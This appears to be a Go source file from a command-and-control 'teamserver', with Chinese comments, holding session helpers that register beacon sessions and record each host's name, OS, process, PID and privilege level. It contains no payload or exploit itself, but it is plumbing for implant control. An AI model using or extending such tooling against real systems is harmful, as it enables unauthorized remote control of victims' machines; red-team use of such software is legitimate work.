package session

import (
	"errors"
	"fmt"

	"cleat/teamserver/internal/logx"
	"cleat/teamserver/internal/store"
)

// ErrNoSession 目标会话不存在。
var ErrNoSession = errors.New("会话不存在或已离线")

// transportOrDefault 取可变参数 transport 的首个非空值; 为空则返回 def。
// 用于 AcceptConn / NewBeaconSession / BeaconFrame / BeaconGet 的可选通道类型:
// 保持既有调用点(尤其测试)零改动, 同时让生产入口显式带上真实通道。
func transportOrDefault(v []string, def string) string {
	if len(v) > 0 && v[0] != "" {
		return v[0]
	}
	return def
}

// toString 安全取 string(兼容 nil 和非 string 类型)。
func toString(v interface{}) string {
	if v == nil {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

// toUint32 安全取 uint32(兼容 float64/int64/int/uint32 类型)。
func toUint32(v interface{}) uint32 {
	switch n := v.(type) {
	case float64:
		return uint32(n)
	case int64:
		return uint32(n)
	case int:
		return uint32(n)
	case uint32:
		return n
	case uint64:
		return uint32(n)
	}
	return 0
}

// toFloat64 安全取 float64(兼容 int/int64 类型)。
func toFloat64(v interface{}) (float64, bool) {
	switch n := v.(type) {
	case float64:
		return n, true
	case int64:
		return float64(n), true
	case int:
		return float64(n), true
	case uint64:
		return float64(n), true
	}
	return 0, false
}

// fillInfo 从 FirstConnect params 填充主机信息。
func fillInfo(rec *store.Record, params map[string]interface{}) {
	if params == nil {
		return
	}
	rec.Hostname = toString(params["hostname"])
	rec.OS = toString(params["os_name"])
	rec.OSVersion = toString(params["os_version"])
	rec.CPU = toString(params["cpu_brand"])
	rec.LocalIP = toString(params["local_ip"])
	rec.Arch = toString(params["architecture"])
	rec.BuildID = toString(params["build_id"])
	if m, ok := toFloat64(params["total_ram_bytes"]); ok {
		rec.Memory = fmt.Sprintf("%.1f GB", m/(1024*1024*1024))
	}
	// 进程信息
	rec.PID = toUint32(params["pid"])
	rec.ProcessName = toString(params["process_name"])
	rec.Privilege = toString(params["privilege"])
	logx.Printf("[+] 会话 #%d 已注册 %s（pid %d · 权限 %s）\n", rec.ID, rec.ProcessName, rec.PID, rec.Privilege)
}

// msgSessionID 从消息提取 session_id(兼容多种 JSON 数字类型)。
func msgSessionID(msg map[string]interface{}) int {
	params, _ := msg["params"].(map[string]interface{})
	if params == nil {
		return -1
	}
	switch v := params["session_id"].(type) {
	case float64:
		return int(v)
	case int64:
		return int(v)
	case int:
		return v
	}
	return -1
}

// sessionByID 从会话表取 *Session。
func (m *Manager) sessionByID(id int) *Session {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.sessions[id]
}

// remoteAddrOf 返回会话连接远端地址; beacon 通道(无 Conn)用 Record.RemoteIP。
func remoteAddrOf(s *Session) string {
	if s.Conn != nil {
		return s.Conn.RemoteAddr().String()
	}
	if s.Record.RemoteIP == "pending" || s.Record.RemoteIP == "" {
		return "beacon"
	}
	return s.Record.RemoteIP
}

// removeSessionMap 断开后从会话表移除(会话仍保留在 store 供重连复用)。
func (m *Manager) removeSessionMap(id int) {
	m.mu.Lock()
	delete(m.sessions, id)
	delete(m.denySince, id)
	m.mu.Unlock()
}
